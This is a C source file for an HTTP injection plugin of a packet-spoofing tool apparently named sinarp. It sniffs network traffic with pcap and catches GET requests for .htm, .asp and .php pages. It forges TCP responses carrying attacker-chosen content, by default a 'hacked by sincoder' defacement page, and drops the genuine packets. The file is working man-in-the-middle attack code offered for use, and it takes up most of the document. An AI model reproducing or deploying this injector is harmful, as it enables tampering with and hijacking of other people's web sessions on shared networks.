#define  _WSPIAPI_COUNTOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//#include <strings.h>
#include <pcap.h>
#include "../../sinarp.h"
#ifdef WIN32
#pragma comment(lib,"../../bin/sinarp.lib")
#pragma comment(lib,"ws2_32.lib")
#define strncasecmp strnicmp
#endif

char  g_http_default_response[] = { "HTTP/1.1 200 OK\r\n"\
"Server: Apache/2.2.22 (Win32) PHP/5.3.13\r\n"\
"X-Powered-By: PHP/5.3.13\r\n"\
"Content-Length: 1000\r\n"\
"Connection: Close\r\n"\
"Content-Type: text/html\r\n\r\n"\
"http://$_host_$/$_url_$ is hacked by sincoder !!!!" };

char *g_filter_url = NULL;	//要过滤的 url 只能设置一个 为了效率
char *g_filter_host = NULL;	//要过滤的 host 也是只能设置一个

typedef struct _filter_pix
{
	uint32 pix;
	struct _filter_pix *next;
}filter_pix;
filter_pix *g_filter_pix = NULL;

char g_http_response[65535] = { 0 };
uint32 g_response_len = 0;
char g_url[65535] = { "I am url " }; //
uint32 g_url_len = 0;
char g_host[65535] = { "I am host" }; //
uint32 g_host_len = 0;
//pcap_t  **g_adhandle;
uint32 *g_url_offset_list = NULL;
uint32 g_url_offset_count = 0;
uint32 *g_host_offset_list = NULL;
uint32 g_host_offset_count = 0;
uint32 g_need2build_http_response = 0; //是不是需要构建 http 返回的 string ..当http返回头里面不包含 $_url_$ $_host_$的时候就不需要构建

typedef enum _string_type
{
	STRING_URL = 0x1,
		STRING_HOST,
		STRING_NORMAL
}string_type;

typedef struct _response_string_list
{
	char *pstr;
	uint32 length;
	string_type type;
	struct _response_string_list *next;
}response_string_list;

response_string_list *g_string_list = NULL;

void insert_into_list(char *str, string_type type)
{
	response_string_list *p;
	if (*str == 0) return;
	if (g_string_list == NULL)
	{
		g_string_list = (response_string_list *)malloc(sizeof(response_string_list));
		g_string_list->type = type;
		g_string_list->pstr = strdup(str);
		g_string_list->length = strlen(str);
		g_string_list->next = NULL;
		return;
	}
	p = g_string_list;
	while (p->next)	p = p->next;
	p->next = ( response_string_list *)malloc(sizeof(response_string_list));
	p = p->next;
	p->type = type;
	p->length = strlen(str);
	p->pstr = strdup(str);
	p->next = NULL;
}

void free_response_string_list()
{
	response_string_list *p = g_string_list;
	while (p)
	{
		free(p->pstr);
		g_string_list = p->next;
		free(p);
		p = g_string_list;
	}
}

BOOL parse_response_string()
{
	char *p1, *p2;
	char buff[65535];
	p1 = p2 = g_http_response;
	
	while (*p1)
	{
		if (*p1 == '$')
		{
			if (strncasecmp(p1, "$_url_$", 7) == 0)
			{
				g_need2build_http_response = 1;
				memcpy(buff, p2, p1 - p2);
				buff[p1 - p2] = 0;
				insert_into_list(buff, STRING_NORMAL);
				insert_into_list(g_url, STRING_URL);
				p1 += 7;
				p2 = p1;
				continue;
			}
			else if (strncasecmp(p1, "$_host_$", 8) == 0)
			{
				g_need2build_http_response = 1;
				memcpy(buff, p2, p1 - p2);
				buff[p1 - p2] = 0;
				insert_into_list(buff, STRING_NORMAL);
				insert_into_list(g_host, STRING_HOST);
				p1 += 8;
				p2 = p1;
				continue;
			}
		}
		++p1;
	}
	memcpy(buff, p2, p1 - p2);
	buff[p1 - p2] = 0;
	insert_into_list(buff, STRING_NORMAL);
	return TRUE;
}

/*
buffer 要插入的数组
count 数组中现在元素的数量
size_of_node 每个元素占的字节数
*/
uint32 insert_into_uint32_buffer(uint32 **buffer, uint32 *count, uint32 value)
{
	uint32 *ptemp_list = *buffer;
	if (ptemp_list == NULL)
	{
		ptemp_list = (uint32 *)malloc(sizeof(uint32));
		++*count;
	}
	else
	{
		ptemp_list = (uint32 *)malloc((*count + 1) * sizeof(uint32));
		memcpy(ptemp_list, *buffer, *count * sizeof(uint32));
		free(*buffer);
		*buffer = ptemp_list;
		ptemp_list = *buffer + *count;
		++*count;
	}
	*ptemp_list = value;
	//memcpy(ptemp_list,&plugin,sizeof(plugin_info));

	return 0;
}


/*
把字符串的长度返回。。。
*/
uint32 build_response_string()
{
	uint32 offset = 0;
	response_string_list *p = g_string_list;
	while (p)
	{
		switch (p->type)
		{
		case STRING_NORMAL:
			{
				memcpy(g_http_response + offset, p->pstr, p->length);
				offset += p->length;
			}
			break;
		case STRING_URL:
			{
				//sinarp_printf("\ncopy  url : %s \n",g_url);
				memcpy(g_http_response + offset, g_url, g_url_len);
				offset += g_url_len;
			}
			break;
		case STRING_HOST:
			{
				memcpy(g_http_response + offset, g_host, g_host_len);
				offset += g_host_len;
			}
			break;
		default:
			break;
		}
		p = p->next;
	}
	g_http_response[offset] = 0;
	//sinarp_printf("\nresponse : %s \n",g_http_response);
	return offset;
}

/*
从 http 头里面解析得到 url  host 
比如传入 
GET /fuck http/1.1\r\n
HOST:fuck.com\r\n\r\n
那么会得到 url = /fuck  host =fuck.com
如果这个函数没有返回 host 那么应该以服务器的ip作为 host

*/
BOOL get_url_host_from_http_header(const char *http, uint32 http_len)
{
	uint32 url_offset;
	uint32 host_offset;
	const char *p = http;
	g_url_len = url_offset = g_host_len = host_offset = 0;
	g_url[0] = 0;
	g_host[0] = 0;
	p += 4;	//skip GET
	while (p - http < http_len)
	{
		if (*p == '/') goto next1;
		++p;
	}
	return FALSE;
next1:
	++p; //skip /
	while (*p == ' ') ++p; //去掉空格
	url_offset = p - http; //find start of url
	while (p - http < http_len && *p != ' ' && *p != '\r')
	{
		++p;
		++g_url_len;
	}
	if (g_url_len > 0)
	{
		memcpy(g_url, http + url_offset, g_url_len);
		g_url[g_url_len] = 0;
	}
	if (*p == ' ')
	{
		//好了 继续向下找 host
		while (p + 4 - http < http_len)
		{
			//要不要只 考虑 Host:这一种情况 ？？ 火狐是这个样子的  Host: 0x74736F48
			if (*(uint32 *)(p - 4) == 0x74736F48 && *p == ':') break;
			++p;
		}
		if (p + 4 - http < http_len)
		{
			p += 1;	// skip :
			while (*p == ' ') ++p;
			host_offset = p - http;	//找到开头了。。
			while (p - http < http_len && *p != ' ' && *p != '\r')
			{
				++g_host_len;
				++p;
			}
			if (g_host_len > 0)
			{
				memcpy(g_host, http + host_offset, g_host_len);
				g_host[g_host_len] = 0;
				return TRUE; //全部都找到了 才返回 TRUE
			}
		}
		else
		{
			//没找到 host
			return FALSE;
		}
	}
	else // 找到包的结尾了
	{
		return FALSE;
	}
	return FALSE;
}

BOOL process_packet(ETHeader *ethdr, uint32 len)
{
	IPHeader *iphdr = (IPHeader *)(((uint8 *)ethdr) + 14);
	uint32 ip_len, data_len;
	uint8 *data_offset;
	uint32 pro_len;
	uint16 sport, dport;
	TCPHeader *tcphdr;
	UDPHEADER *udphdr;
	//  for http inject
	uint8 *pFlag = NULL;
	uint8 spoof_packet[1500];
	uint32 spoof_packet_len;
	uint32 pix;
	filter_pix *pix_list;
	//uint32 g_response_len = 0;
	ip_len = (iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
	if (iphdr->ipProtocol == PROTO_TCP)
	{
		// 找到TCP的位置
		tcphdr = (TCPHeader *)((u_char *)iphdr + ip_len);
		pro_len = ((tcphdr->dataoffset >> 4) * sizeof(unsigned long));
		sport = ntohs(tcphdr->sourcePort);
		dport = ntohs(tcphdr->destinationPort);
		
		//printf("%s \n",(unsigned char *)iphdr + ip_len + pro_len);
	}
	else if (iphdr->ipProtocol == PROTO_UDP)
	{
		// 找到UDP的位置
		udphdr = (UDPHEADER *)((u_char *)iphdr + ip_len);
		pro_len = ntohs(udphdr->uh_len);
		sport = ntohs(udphdr->uh_sport);
		dport = ntohs(udphdr->uh_dport);
	}
	else
	{
		//不认识的东东
		return TRUE;
	}
	// 数据长度
	data_len = ntohs(iphdr->ipLength) - (ip_len + pro_len);
	// 指向数据的指针
	data_offset = (unsigned char *)iphdr + ip_len + pro_len;
	
	switch (iphdr->ipProtocol)
	{
	case PROTO_TCP:
		{
			//回复  一个包 看看  。。。 如果出错的话 那么接着断开连接
			/*
			Accept text/html,application/xhtml+xml,application/xml;q=0.9,
			0x20544547  "GET "
			IE  浏览器 坑爹啊 请求图片啥的 都是 accept: * / *
			我们还是查找 .html 
			*/
			//只处理 GET 请求
			if (data_len > 20 && (*(uint32 *)data_offset) == 0x20544547) //"GET "
			{
			/*
			数据的处理要求非常快速
			只关注指定的网页 .htm .asp .php .jsp  
			.htm --> 0x6D74682E
			.asp --> 0x7073612E
			.php --> 0x7068702E
			.jsp <-- 这个不想搞了  感觉太少了 
			貌似那个 Js 也需要我们动态的改写 好让弹出 合适的网页
				*/
				pFlag = (uint8 *)sinarp_memfind(data_offset, data_len, "=s1Nc0d3r", 9, NULL, TRUE);	//查找插入标识
				if (pFlag == NULL) //没找到标识那么就进行欺骗
				{
					pFlag = data_offset;
					while (*pFlag)
					{
						if (*pFlag == '.')
						{
							pix = *(uint32 *)pFlag;
							//开始对比
							if (g_filter_pix == NULL) //使用默认的过滤后缀
							{
								if (pix == 0x6D74682E || pix == 0x7073612E || pix == 0x7068702E)
								{
									//找到了
									goto spoof;
								}
							}
							else
							{
								//使用后缀链表里的后缀进行比对、
								pix_list = g_filter_pix;
								while (pix_list)
								{
									if (pix == pix_list->pix) goto spoof;
									pix_list = pix_list->next;
								}
								return TRUE; //没找到直接返回
							}
						}
						else if (*pFlag == '\r') break;
						else if (*pFlag == '/' && *(pFlag + 1) == ' ')
						{
							//请求 首页 或者 一个目录
							goto spoof;
						}
						pFlag++;
					}
					return TRUE;
spoof:
					get_url_host_from_http_header((char *)data_offset, len);
					if (g_host[0] && g_url[0])
					{
						//进行 url 和 host 过滤
						if (g_filter_url)
						{
							if (strcmp(g_url, g_filter_url) != 0)
							{
								return TRUE;
							}
						}
						if (g_filter_host)
						{
							if (strcmp(g_host, g_filter_host) != 0)	return TRUE;
						}
						//sinarp_printf("\n %s %s %u %u \n",g_host,g_url,g_host_len,g_url_len);
						if (g_need2build_http_response)	g_response_len = build_response_string();
						//else
						//{
						//	response_len = strlen(g_http_response);  //这里可以优化下
						//}
						sinarp_build_tcp_response_packet(ethdr, spoof_packet, &spoof_packet_len, (uint8 *)g_http_response, g_response_len);
						if (pf_pcap_sendpacket(g_adhandle, spoof_packet, spoof_packet_len) < 0)
						{
							printf("\r[!] http_injector: send packet failed !\r\n");
							return TRUE;  //让上级转发数据包
						}
						sinarp_printf("\r\nInject OK : %s --> %s http://%s/%s \n",
							sinarp_iptos(iphdr->ipSource),
							sinarp_iptos(iphdr->ipDestination),
							g_host,
							g_url);
						return FALSE;  //不转发这个数据包
					}
					return TRUE; //让上级转发这个数据包
				}
			}
		}
		break;
	case PROTO_UDP:
		{}
		break;
	default:
		break;
	}
	return TRUE;
}

BOOL plugin_init()
{
	//HANDLE hfile;
	//HMODULE hexe;
	uint8 *config_data;
	uint32 dwBytes = 0;
	char buff[65535] ={0};
	char value[65535] = {0};
	const char *p1, *p2;
	char pix[10];
	filter_pix *pfilter = NULL;
	
	sinarp_printf("%s", "http inject plugin load ...\n");
	//从 文件中读取要返回的数据包
	sinarp_printf("%s", "read config file..\n");
	
	//hfile = CreateFileA("http.sin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	config_data = sinarp_load_file_into_mem("http.sin");
	if (config_data == NULL)
	{
		sinarp_printf("load config file failed,use default \n");
		g_http_response[0] = 0;
		strcpy(g_http_response, g_http_default_response);
	}
	else
	{
		sinarp_printf("%s   \n ",config_data);

		strcpy((char *)buff,(char *)config_data);

		//free(config_data);

		if (sinarp_find_string_by_flag(buff, "suffix = [", "]", value, 65535))	//如果没有指定 使用内置的配置
		{
			//	if(value[0] != '*')
			//	{
			p1 = value;
			while ((p1 = sinarp_take_out_string_by_char(p1, pix, 10, ',')))
			{
				//sinarp_printf("--%s--",pix);
				if (g_filter_pix == NULL)
				{
					g_filter_pix = (filter_pix *)malloc(sizeof(filter_pix));
					g_filter_pix->next = NULL;
					pfilter = g_filter_pix;
				}
				else
				{
					pfilter = g_filter_pix;
					while (pfilter->next) pfilter = pfilter->next;
					pfilter->next = (filter_pix *)malloc(sizeof(filter_pix));
					pfilter = pfilter->next;
				}
				pfilter->next = NULL;
				pfilter->pix = *(uint32 *)pix;
			}
			//	}
		}
		if (sinarp_find_string_by_flag(buff, "url = [", "]", value, 65535))
		{
			if (value[0] != '*') g_filter_url = strdup(value);
		}
		if (sinarp_find_string_by_flag(buff, "host = [", "]", value, 65535))
		{
			if (value[0] != '*') g_filter_host = strdup(value);
		}
		if (sinarp_find_string_by_flag(buff, "response = [", "]", value, 65535))
		{
			g_http_response[0] = 0;
			strcpy(g_http_response, value);
			g_response_len = strlen(g_http_response) + 1;
			//sinarp_printf("%s",g_http_response);
		}
	}
	//打印下配置信息
	pfilter = g_filter_pix;
	if (pfilter)
	{
		sinarp_printf("filted pix:\n");
		while (pfilter)
		{ //要过滤的后缀
			*(uint32 *)value = pfilter->pix;
			value[4] = 0;
			sinarp_printf("\t%s\n", value);
			pfilter = pfilter->next;
		}
	}
	else
	{
		sinarp_printf("do not indicate pix use default: .asp .php .htm\n");
	}
	if (g_filter_url) sinarp_printf("filted url:%s\n", g_filter_url);
	if (g_filter_host) sinarp_printf("filted host:%s\n", g_filter_host);
	parse_response_string();
	
	return TRUE;
}


void *plugin_unload()
{
	filter_pix *pfilter = NULL;
	free_response_string_list();
	if (g_filter_host) free(g_filter_host);
	if (g_filter_url) free(g_filter_url);
	if (g_filter_pix)
	{
		pfilter = g_filter_pix;
		while (g_filter_pix)
		{
				pfilter = g_filter_pix->next;
				free(g_filter_pix);
				g_filter_pix = pfilter;
		}
	}
	return NULL;
}


/*

  BOOL __stdcall DllMain(HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved)
  {
  HANDLE hfile;
  HMODULE hexe;
  DWORD dwBytes = 0;
  char buff[65535];
  char value[65535];
  const char *p1, *p2;
  char pix[10];
  filter_pix *pfilter = NULL;
  
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
	sinarp_printf("%s", "http inject plugin load ...\n");
	//从 文件中读取要返回的数据包
	sinarp_printf("%s", "read config file..\n");
	hfile = CreateFileA("http.sin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
				sinarp_printf("load config file failed,use default \n");
				g_http_response[0] = 0;
				strcpy(g_http_response, g_http_default_response);
				}
				else
				{
				ReadFile(hfile, buff, 65535, &dwBytes, NULL);
				if (dwBytes < 1)
				{
				sinarp_printf("\nread file failed !\nuse default config~~\n");
				g_http_response[0] = 0;
				strcpy(g_http_response, g_http_default_response);
				}
				CloseHandle(hfile);
				}
				hexe = GetModuleHandle(NULL);
				g_adhandle = (pcap_t **)GetProcAddress(hexe, "g_adhandle");
				
				  //开始解析配置文件
				  if (dwBytes > 1)
				  {
				  if (sinarp_find_string_by_flag(buff, "suffix = [", "]", value, 65535))	//如果没有指定 使用内置的配置
				  {
				  //	if(value[0] != '*')
				  //	{
				  p1 = value;
				  while ((p1 = sinarp_take_out_string_by_char(p1, pix, 10, ',')))
				  {
				  //sinarp_printf("--%s--",pix);
				  if (g_filter_pix == NULL)
				  {
				  g_filter_pix = (filter_pix *)malloc(sizeof(filter_pix));
				  g_filter_pix->next = NULL;
				  pfilter = g_filter_pix;
				  }
				  else
				  {
				  pfilter = g_filter_pix;
				  while (pfilter->next) pfilter = pfilter->next;
				  pfilter->next = (filter_pix *)malloc(sizeof(filter_pix));
				  pfilter = pfilter->next;
				  }
				  pfilter->next = NULL;
				  pfilter->pix = *(uint32 *)pix;
				  }
				  //	}
				  }
				  if (sinarp_find_string_by_flag(buff, "url = [", "]", value, 65535))
				  {
				  if (value[0] != '*') g_filter_url = strdup(value);
				  }
				  if (sinarp_find_string_by_flag(buff, "host = [", "]", value, 65535))
				  {
				  if (value[0] != '*') g_filter_host = strdup(value);
				  }
				  if (sinarp_find_string_by_flag(buff, "response = [", "]", value, 65535))
				  {
				  g_http_response[0] = 0;
				  strcpy(g_http_response, value);
				  g_response_len = strlen(g_http_response) + 1;
				  //sinarp_printf("%s",g_http_response);
				  }
				  }
				  //打印下配置信息
				  pfilter = g_filter_pix;
				  if (pfilter)
				  {
				  sinarp_printf("要过滤的后缀:\n");
				  while (pfilter)
				  { //要过滤的后缀
				  *(uint32 *)value = pfilter->pix;
				  value[4] = 0;
				  sinarp_printf("\t%s\n", value);
				  pfilter = pfilter->next;
				  }
				  }
				  else
				  {
				  sinarp_printf("未指定过滤后缀 使用默认的 .asp .php .htm\n");
				  }
				  if (g_filter_url) sinarp_printf("要过滤的url:%s\n", g_filter_url);
				  if (g_filter_host) sinarp_printf("要过滤的host:%s\n", g_filter_host);
				  parse_response_string();
				  }
				  break;
				  case DLL_PROCESS_DETACH:
				  {
				  free_response_string_list();
				  if (g_filter_host) free(g_filter_host);
				  if (g_filter_url) free(g_filter_url);
				  if (g_filter_pix)
				  {
				  pfilter = g_filter_pix;
				  while (g_filter_pix)
				  {
				  pfilter = g_filter_pix->next;
				  free(g_filter_pix);
				  g_filter_pix = pfilter;
				  }
				  }
				  }
				  break;
				  default:
				  break;
				  }
				  return TRUE;
				  }
				  
					
*/